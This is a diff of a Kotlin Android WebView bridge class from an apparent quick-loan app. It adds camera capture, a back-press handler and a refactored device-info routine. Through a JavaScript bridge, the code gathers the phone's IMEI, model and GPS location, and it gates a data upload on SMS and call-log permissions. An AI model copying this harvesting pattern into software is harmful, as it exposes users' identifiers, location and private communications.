@@ -8,11 +8,15 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.databinding.DataBindingUtil
 import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.media.Image
 import android.net.Uri
 import android.os.Build
+import android.os.SystemClock
+import android.provider.MediaStore
 import android.support.annotation.RequiresApi
 import android.support.v4.app.ActivityCompat
+import android.support.v4.content.FileProvider
 import android.telephony.TelephonyManager
 import android.util.Base64
 import android.util.Log
@@ -20,21 +24,28 @@ import android.view.View
 import android.webkit.WebResourceError
 import android.webkit.WebResourceRequest
 import android.webkit.WebView
+import android.widget.Toast
 import club.rosaemperor.myeyesopen.http.HttpService
 import club.rosaemperor.myeyesopen.http.RetrofitUtil
 import com.google.gson.Gson
 import com.google.gson.JsonObject
+import com.vaynhanh.vaynhanh.MainActivity
+import com.vaynhanh.vaynhanh.R
 import com.vaynhanh.vaynhanh.app.VayNhanhApplication
 import com.vaynhanh.vaynhanh.databinding.ActivityMainBinding
 import com.vaynhanh.vaynhanh.http.beans.*
 import com.vaynhanh.vaynhanh.utils.*
 import com.vaynhanh.vaynhanh.utils.SharePrefenceHelper.Companion.mContext
+import org.json.JSONException
 import org.json.JSONObject
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
 import java.io.ByteArrayOutputStream
+import java.io.File
+import java.io.IOException
 import java.net.URISyntaxException
+import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.collections.ArrayList
 
@@ -44,9 +55,15 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
     var imageGetMobile :String=""
     var imageType = ""
     var CAMERA_REQUEST_CODE=1110
+    var READ_PHONE_CODE = 1112
     val DATA_PERMISSIONS = 1111
     var cameraList = ArrayList<String>()
     var ACTIVITYFOROMCLIENT = 10010
+    var readPhoneCallBack : WVJBResponseCallback? = null
+    var firstClickTime: Long = 0L
+    var dataUpLoadResult = false
+    var mCurrentPhotoPath: String = ""
+    var dataUpLoadCallback :WVJBResponseCallback? = null
     var httpHelper : HttpService = RetrofitUtil.instance.help
     constructor(webView: WebView) : this(webView ,object :WVJBHandler{
         override fun request(data: Any?, callback: WVJBResponseCallback?) {
@@ -67,6 +84,7 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
                             ActivityCompat.checkSelfPermission(webView.context,Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                             ActivityCompat.checkSelfPermission(webView.context,  Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                             ActivityCompat.checkSelfPermission(webView.context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                        dataUpLoadCallback = callback
                         upLoadData()
 
                     }else{
@@ -127,36 +145,41 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
             override fun request(data: Any?, callback: WVJBResponseCallback?) {
                 val jsonObject = JSONObject()
                 if (ActivityCompat.checkSelfPermission(webView.context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                    var tm = webView.context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-
-                    var deviceID = if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
-                        tm.deviceId
-                    } else {
-                        tm.imei
-                    }
-                    var deviceVersion = Build.MODEL
-                    var systemVersion = Build.VERSION.RELEASE
-                    var deviceName = Build.HOST
-                    jsonObject.put("deviceOwner", deviceName)
-                    jsonObject.put("deviceBrand", deviceVersion)
-                    jsonObject.put("deviceImei", deviceID)
-                    jsonObject.put("osVer", systemVersion)
-                    var s = ChannelModule(webView.context).channel
-                    val ss = s.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
-                    if (ss.size == 2)
-                        s = ss[1]
-                    jsonObject.put("channelCode", s)
-
-                    val location = GetGeoUtil(webView.context as Activity).geo
-                    if (location != null) {
-                        jsonObject.put("geoLon", location.longitude)
-                        jsonObject.put("geoLat", location.latitude)
-                    }
-
-                    Log.e("devceInfo", jsonObject.toString())
-
+                    postDeviceInfo(jsonObject)
                     callback!!.callback(jsonObject.toString())
+                }else{
+                    cameraList.clear()
+                    cameraList.add(android.Manifest.permission.READ_PHONE_STATE)
+                    if (Build.VERSION.SDK_INT >= 23 ){
+                        (webView.context as Activity).requestPermissions(cameraList.toTypedArray(),READ_PHONE_CODE)
+                        readPhoneCallBack = callback
+                    }
+
                 }
+            }
+        })
+
+        registerHandler("backPress", object : WVJBHandler {
+            override fun request(data: Any?, callback: WVJBResponseCallback?) {
+                val s = ""
+                val jsonObject = data as org.json.JSONObject
+                jsonObject.toString()
+                try {
+                    val b = jsonObject.getBoolean("isRootPage")
+                    if (b) {
+                        if (System.currentTimeMillis() - firstClickTime < 2000) {
+                            (webView.context as Activity).finish()
+                        } else {
+                            firstClickTime = System.currentTimeMillis()
+                            Toast.makeText(webView.context, R.string.double_click_to_quit, Toast.LENGTH_SHORT).show()
+                        }
+                    } else {
+                        webView.goBackOrForward(-1)
+                    }
+                } catch (e: JSONException) {
+                    e.printStackTrace()
+                }
+
             }
         })
 
@@ -169,14 +192,27 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
         SplashScreen.hide(view.context as Activity?)
     }
 
-    fun onActivityResult(intent : Intent){
-        Log.d("TAG",""+(intent.extras.get("data") as Bitmap).byteCount )
+    fun onActivityResult(intent : Intent?){
+        var time = System.currentTimeMillis()
+        val mImageBitmap = BitmapUtils.getFitSampleBitmap(mCurrentPhotoPath, 800, 800)
 
-        var resultImage = intent.extras.get("data") as Bitmap
-        val baos = ByteArrayOutputStream()
-        resultImage.compress(Bitmap.CompressFormat.PNG, 100, baos)
-        var imageString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
-        upImageWithNoOCR(imageString)
+       var imageString= ""
+
+//            Log.d("TAGS",""+mImageBitmap!!.byteCount)
+        val options = BitmapFactory.Options()
+        options.inSampleSize = 1
+        val nBitmap = BitmapFactory.decodeFile(mCurrentPhotoPath, options)
+            val baos = ByteArrayOutputStream()
+
+        nBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
+//        Log.d("TAGS","after:${nBitmap.byteCount}")
+        var thread = Thread(Runnable {
+            imageString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
+            time = System.currentTimeMillis()-time
+            Log.d("time","$time")
+            upImageWithNoOCR(imageString)
+        })
+        thread.start()
 
     }
 
@@ -194,7 +230,10 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
             callBackBean.message = "暂时没有使用OCR"
             callBackBean.data= imageString
             callBackBean.decodeData = "没有使用OCR"
-            callHandler("getImg",gson.toJson(callBackBean))
+            (webView.context as Activity).runOnUiThread {
+                callHandler("getImg",gson.toJson(callBackBean))
+            }
+
         }
     }
 
@@ -232,14 +271,13 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
                     takePhoto()
                 }
             }
+            READ_PHONE_CODE -> {
+                if(grantResults[0] == 0) postDeviceInfo(JSONObject())
+            }
         }
 
     }
 
-    private fun takePhoto() {
-        val intent = Intent("android.media.action.IMAGE_CAPTURE")
-        (webView.context as Activity).startActivityForResult(intent, ACTIVITYFOROMCLIENT)
-    }
 
     val IMAGE_TYPE_OCR_FRONT = "one"
     val IMAGE_TYPE_OCR_BACK = "OCR_BACK"
@@ -276,6 +314,9 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
                 }
 
                 override fun onResponse(call: Call<Any>?, response: Response<Any>?) {
+                    dataUpLoadResult= true
+                    dataUpLoadCallback!!.callback(dataUpLoadResult)
+
                 }
             })
         })
@@ -361,14 +402,100 @@ class WVWebViewClient constructor(webView: WebView,messageHandler: WVJBHandler? 
     }
 
     private fun networkError(view: WebView) {
-        view.visibility = View.INVISIBLE
+//        view.visibility = View.INVISIBLE
         var binding = DataBindingUtil.findBinding<ActivityMainBinding>(view)
-        binding!!.viewModel!!.webViewVisiable.set(View.VISIBLE)
-        binding!!.viewModel!!.errorViewVisiable.set(View.VISIBLE)
+//        binding!!.viewModel!!.webViewVisiable.set(View.GONE)
+//        binding!!.viewModel!!.errorViewVisiable.set(View.VISIBLE)
         if (SplashScreen.b) {
             SplashScreen.b = false
             SplashScreen.hide(webView.context as Activity)
         }
 
+
+
     }
+    fun postDeviceInfo(jsonObject: JSONObject){
+        var tm = webView.context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+
+        var deviceID = if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O_MR1) {
+            tm.deviceId
+        } else {
+            tm.imei
+        }
+        var deviceVersion = Build.MODEL
+        var systemVersion = Build.VERSION.RELEASE
+        var deviceName = Build.HOST
+        jsonObject.put("deviceOwner", deviceName)
+        jsonObject.put("deviceBrand", deviceVersion)
+        jsonObject.put("deviceImei", deviceID)
+        jsonObject.put("osVer", systemVersion)
+        var s = ChannelModule(webView.context).channel
+        val ss = s.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
+        if (ss.size == 2)
+            s = ss[1]
+        jsonObject.put("channelCode", s)
+
+        val location = GetGeoUtil(webView.context as Activity).geo
+        if (location != null) {
+            jsonObject.put("geoLon", location.longitude)
+            jsonObject.put("geoLat", location.latitude)
+        }
+
+        Log.e("devceInfo", jsonObject.toString())
+    }
+
+
+    @Throws(IOException::class)
+    private fun createImageFile(): File {
+        // Create an image file name
+        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
+        val imageFileName = "JPEG_" + timeStamp + "_"
+        val storageDir = (webView.context as MainActivity).filesDir
+        val image = File.createTempFile(
+                imageFileName, /* prefix */
+                ".jpg", /* suffix */
+                storageDir      /* directory */
+        )
+
+        // Save a file: path for use with ACTION_VIEW intents
+        mCurrentPhotoPath = image.absolutePath
+
+        return image
+    }
+
+     fun takePhoto() {
+        // https://developer.android.com/training/camera/photobasics#TaskCaptureIntent
+
+        val takePictureIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+        // Ensure that there's a camera activity to handle the intent
+        if (takePictureIntent.resolveActivity(webView.context.packageManager) != null) {
+            // Create the File where the photo should go
+            var photoFile: File? = null
+            try {
+                photoFile = createImageFile()
+                if (!photoFile.getParentFile().exists()) {
+                    photoFile.getParentFile().mkdir()
+                }
+            } catch (ex: IOException) {
+                // Error occurred while creating the File
+//                Toast.makeText(this@BrowserActivity, "get an exception while taking photo", Toast.LENGTH_SHORT).show()
+                Log.e("file create error", "" + ex.toString())
+            }
+
+            // Continue only if the File was successfully created
+            if (photoFile != null) {
+                val photoURI: Uri
+                if (Build.VERSION.SDK_INT >= 24) {
+                    photoURI = FileProvider.getUriForFile(webView.context, "com.vaynhanh.vaynhanh.fileprovider", photoFile)
+                } else {
+                    photoURI = Uri.fromFile(photoFile)
+                }
+                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoURI)
+                (webView.context as MainActivity).startActivityForResult(takePictureIntent, ACTIVITYFOROMCLIENT)
+            }
+
+
+        }
+    }
+
 }
